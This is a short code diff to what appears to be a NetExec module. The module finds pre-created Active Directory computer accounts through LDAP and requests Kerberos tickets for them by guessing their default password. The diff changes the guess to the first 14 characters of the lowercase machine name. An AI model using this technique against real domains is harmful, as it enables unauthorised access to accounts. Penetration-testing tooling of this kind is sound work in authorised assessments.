@@ -24,7 +24,7 @@ class NXCModule:
 
     def on_login(self, context, connection):
         try:
-            ldap_connection = connection.ldapConnection
+            ldap_connection = connection.ldap_connection
 
             # Define the search filter for pre-created computer accounts
             search_filter = "(&(objectClass=computer)(userAccountControl=4128))"
@@ -94,7 +94,7 @@ class NXCModule:
     def get_tgt(self, context, username, domain, kdcHost, ccache_base_dir):
         try:
             userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-            password = username  # Password is the machine name in lowercase
+            password = username[:14]  # Password is the first 14 characters of the machine name in lowercase
             context.log.info(f"Getting TGT for {username}@{domain}")
 
             tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
